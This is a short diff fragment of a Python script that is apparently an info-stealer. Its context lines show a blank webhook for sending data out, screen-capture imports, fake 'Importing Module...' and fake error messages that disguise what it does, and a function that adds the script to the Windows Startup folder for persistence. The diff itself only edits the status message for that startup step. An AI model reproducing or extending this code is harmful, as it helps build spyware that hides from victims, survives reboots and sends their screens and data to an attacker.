@@ -23,7 +23,7 @@ from PIL import ImageGrab
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
 fakeerror = True # If True it will make an fake error message at the end
 webhook = '' #Put ur webhook
-Startup = 'Dont mind this'
+Startup = 'Unsuccessfully added to startup !'
 
 if shitty_message == True:
     print('Importing Module...')
@@ -35,7 +35,7 @@ USER_NAME = getpass.getuser()
 def add_to_startup(py_file_path=file_path, bat_file_path=None):
     if not bat_file_path:
         bat_file_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
+    Startup = 'Successfully added to startup !'
     py_file_name = os.path.basename(py_file_path)
     py_shortcut_path = os.path.join(bat_file_path, py_file_name[:-3] + "lnk")
     python_exe_path = os.path.join(os.path.dirname(os.__file__), 'pythonw.exe')
